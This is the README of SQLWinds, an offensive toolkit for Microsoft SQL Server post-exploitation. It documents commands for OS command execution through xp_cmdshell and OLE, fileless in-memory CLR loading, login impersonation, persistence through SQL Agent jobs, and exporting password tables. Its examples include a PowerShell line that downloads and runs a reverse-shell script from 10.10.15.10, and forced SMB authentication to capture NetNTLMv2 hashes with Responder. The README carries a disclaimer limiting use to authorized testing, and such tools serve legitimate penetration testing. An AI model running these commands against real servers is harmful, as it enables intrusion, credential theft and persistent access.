# SQLWinds

**SQL Security Assessment & Post-Exploitation Toolkit**

SQLWinds is a command-line tool for security testing and exploiting Microsoft SQL Server. It provides an interactive environment to deeply analyze servers, escalate privileges, execute attacks, and pivot through networks all with specialized commands for tasks like in-memory code execution and SCCM database exploration.

<br>

<p align="center">
  <img src="https://github.com/user-attachments/assets/b3f0fd0e-617c-4ef3-98c2-ce7abe0f2482" alt="SQLWinds" />
</p>


---

## Features

*   **Diverse Authentication:** Supports SQL, Windows Integrated (`--integrated`), and Kerberos delegation (`--kerberos` with `--user`/`--pass`).
*   **Comprehensive Enumeration:**
    *   Server info, databases, tables, columns, users, and permissions.
    *   Security configuration audit (xp_cmdshell, CLR, OLE, etc.).
    *   Sensitive data discovery and secret extraction.
    *   Linked server enumeration and exploitation.
*   **Post-Exploitation & Lateral Movement:**
    *   **Code Execution:** Enable and use `xp_cmdshell`, OLE Automation Procedures (`sp_oacreate`), and CLR integration.
    *   **In-Memory CLR:** Load and execute .NET assemblies directly from memory without dropping files to disk (`:memclr`).
    *   **Credential Theft:** Force SMB authentication to a UNC path for relay attacks (`:unc_smb`).
    *   **Registry Interaction:** Read registry keys and values via `xp_regread`.
    *   **Persistence:** Create, list, and execute SQL Agent Jobs.
    *   **Data Exfiltration:** Upload/download files and export query results to CSV/JSON.
*   **SCCM Database Interaction:** (If the target database is SCCM)
    *   Detect SCCM and report version/site info.
    *   Inventory hardware, software, collections, and deployments.
    *   Perform SCCM-specific security audits.
*   **Kerberos Analysis:** Check Active Directory for SPNs associated with the target to troubleshoot Kerberos authentication.
*   **Instance Discovery:** Enumerate SQL Server instances available on the domain.
*   **Advanced REPL:** Interactive environment with auto-completion and command history.

---

## Installation & Compilation

### Quick Build
The repository includes a `build.bat` script for easy compilation on Windows:

```bash
.\build.bat
```

The compiled `SQLWinds.exe` executable will be placed in the `bin\Release\` directory.

### Manual Build
1.  Ensure you have the .NET Framework (≥ 4.6.1) or .NET SDK installed.
2.  Clone the repository:
    ```bash
    git clone https://github.com/blue0x1/sqlwinds.git
    cd sqlwinds
    ```
3.  Compile the solution:
    ```bash
    msbuild SQLWinds.sln /p:Configuration=Release
    ```

---

## Usage

### Basic Connection

```bash
# SQL Authentication
SQLWinds.exe --server TARGET\\INSTANCE --user sa --pass Password123

# Windows Authentication (Current User Context)
SQLWinds.exe --server sql01.corp.local --integrated

# Kerberos Delegation (with provided credentials)
SQLWinds.exe --server sql01.prod.corp.local --kerberos --user CORP\\svc_sql --pass SvcPass123!

# Connect and run a single command
SQLWinds.exe --server 10.0.0.5 --user sa --pass pass --run-cmd "SELECT name FROM sys.databases"
```

### Common Command-Line Options

| Option | Description |
| :--- | :--- |
| `--server` | Target server (IP, hostname, instance). **Required.** |
| `--user`, `--pass` | Credentials for SQL or Windows auth. |
| `--integrated` | Use current Windows token for authentication. |
| `--kerberos` | Use Kerberos authentication flow. |
| `--spn-check` | Check AD for SPNs for the target host. |
| `--run-cmd "<SQL>"` | Execute a single SQL command and exit. |
| `--run-file file.sql` | Execute a SQL script from a file and exit. |
| `--info` | Gather and display extensive server information. |
| `--getinstance` | Discover SQL instances in the domain and exit. |
| `--list-dbs` | List databases and exit. |
| `--security-audit` | Perform security audit and exit. |

### Interactive REPL Mode


```
sqlwinds> :info
sqlwinds> :dbs
sqlwinds> :users
sqlwinds> :enable_xp_cmdshell
sqlwinds> :xp whoami
sqlwinds> :spn
sqlwinds> help
```

#### Complete REPL Command Reference

| Command | Description | Example |
| :--- | :--- | :--- |
| `:info` | Show detailed server information | `:info` |
| `:dbs` | List all databases with details | `:dbs` |
| `:tables [db] [schema]` | List tables in database/schema | `:tables master dbo` |
| `:columns <table> [schema] [db]`| List columns for a table | `:columns Users dbo MyDatabase` |
| `:users` | List all SQL logins and database users | `:users` |
| `:perms` | Show current user permissions | `:perms` |
| `:audit` | Perform security configuration audit | `:audit` |
| `:search [term]` | Search for sensitive data | `:search password` |
| `:secrets` | Extract potential secrets | `:secrets` |
| `:services` | Show SQL Server service accounts | `:services` |
| `:spn` | Check SPNs for the target host | `:spn` |
| `:enable_xp_cmdshell` | Enable xp_cmdshell | `:enable_xp_cmdshell` |
| `:disable_xp_cmdshell` | Disable xp_cmdshell | `:disable_xp_cmdshell` |
| `:xp <command>` | Run OS command via xp_cmdshell | `:xp whoami` |
| `:enable_ole` | Enable OLE Automation | `:enable_ole` |
| `:disable_ole` | Disable OLE Automation | `:disable_ole` |
| `:ole_cmd <command>` | Run OS command via OLE | `:ole_cmd "calc.exe"` |
| `:enable_clr` | Enable CLR integration | `:enable_clr` |
| `:disable_clr` | Disable CLR integration | `:disable_clr` |
| `:deploy-clr <path>` | Deploy CLR assembly from file | `:deploy-clr C:\Tools\cmd.dll` |
| `:list-assemblies` | List deployed CLR assemblies | `:list-assemblies` |
| `:clr_exec` | Execute a CLR method | `:clr_exec MyAssembly MyClass Method arg1` |
| `:memclr` | **Execute CLR assembly from memory** | `:memclr "C:\Tools\exec.dll" "Namespace.Class" "Method" "arg"` |
| `:remove-assembly <name>` | Remove a CLR assembly | `:remove-assembly MyAssembly` |
| `:list_linkservers` | List linked servers | `:list_linkservers` |
| `:linkrpc <srv> <cmd>` | Execute command via linked server | `:linkrpc LINKEDSRV "whoami"` |
| `:impersonate <login>` | Impersonate a SQL login | `:impersonate sa` |
| `:revert` | Revert security context | `:revert` |
| `:agent_job` | Manage SQL Agent jobs | `:agent_job create MyJob "whoami"` |
| `:ls [path]` | List directory via SQL | `:ls C:\Windows\Temp` |
| `:unc_smb <path>` | Force SMB auth to UNC | `:unc_smb \\192.168.1.100\share` |
| `:plain` | **Paste large SQL scripts** | *(See example below)* |
| `:regread` | Read registry value | `:regread HKEY_LOCAL_MACHINE Software\Microsoft value` |
| `:regread_all` | List all values in a key | `:regread_all HKEY_LOCAL_MACHINE Software\Microsoft` |
| `:upload` | Upload file to table | `:upload C:\file.txt MyTable` |
| `:download` | Download binary from query | `:download "SELECT file FROM blobs" out.bin` |
| `:exportcsv` | Export query to CSV | `:exportcsv "SELECT * FROM users" out.csv` |
| `:exportjson` | Export query to JSON | `:exportjson "SELECT * FROM users" out.json` |
| `:sccm_info` | Detect SCCM database | `:sccm_info` |
| `:sccm_inventory` | Show SCCM inventory | `:sccm_inventory` |
| `:sccm_collections` | List SCCM collections | `:sccm_collections "All Systems"` |
| `:sccm_deployments` | Show deployments | `:sccm_deployments` |
| `:sccm_clients` | List clients | `:sccm_clients inactive` |
| `:sccm_audit` | SCCM security audit | `:sccm_audit` |
| `:sccm_application` | Show app details | `:sccm_application "Google Chrome"` |
| `help` | Show help | `help` |
| `exit` | Exit the REPL | `exit` |

#### Example: Using `:plain` for Large Scripts
The `:plain` command is essential for executing large, multi-line SQL scripts.

```
sqlwinds> :plain
SQL> 
SQL> BEGIN TRY
.....>     SELECT * FROM [VeryImportantTable];
.....>     EXEC sp_configure 'show advanced options', 1;
.....>     RECONFIGURE;
.....> END TRY
.....> BEGIN CATCH
.....>     SELECT ERROR_MESSAGE();
.....> END CATCH
.....> :execute
```
1.  Type `:plain` and press Enter.
2.  Paste or type your complete SQL script.
3.  On a new line, type `:execute` to run the entire script or `:cancel` to abort.

---

## Examples

**1. Audit**
```bash
SQLWinds.exe --server dc01 --integrated --security-audit 
```

**2. Leveraging xp_cmdshell for Code Execution**
```bash
SQLWinds.exe --server 192.168.1.15 --user sa --pass pass --enable-xp-cmdshell
# In the REPL that opens:
sqlwinds> :xp whoami /all
sqlwinds> :xp powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.10/revshell.ps1')"
```

**3. In-Memory CLR Execution (Fileless)**
```bash
# Compile your .NET assembly to a DLL (e.g., CommandExecutor.dll)
sqlwinds> :enable_clr
sqlwinds> :memclr "C:\Tools\CommandExecutor.dll" "CommandExecutor.Class1" "Exec" "whoami"
```

**4. Stealing NetNTLMv2 Hashes via SRelay**
```bash
# On your machine: sudo responder -I tun0
sqlwinds> :unc_smb \\10.10.15.10\fake_share
```

**5. SCCM Database Exploitation**
```bash
SQLWinds.exe --server sccmdb.corp.local --integrated
sqlwinds> :sccm_info
sqlwinds> :sccm_collections
sqlwinds> :sccm_application "Microsoft 365"
```

**6. Data Exfiltration**
```bash
# Export sensitive data to CSV
sqlwinds> :exportcsv "SELECT username, password FROM users" credentials.csv

# Download a file stored in the database
sqlwinds> :download "SELECT file_data FROM documents WHERE id=1" secret.docx
```

---

## Disclaimer

This tool is intended for **authorized security testing and educational purposes only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

---



## Credits

Developed by **blue0x1**.
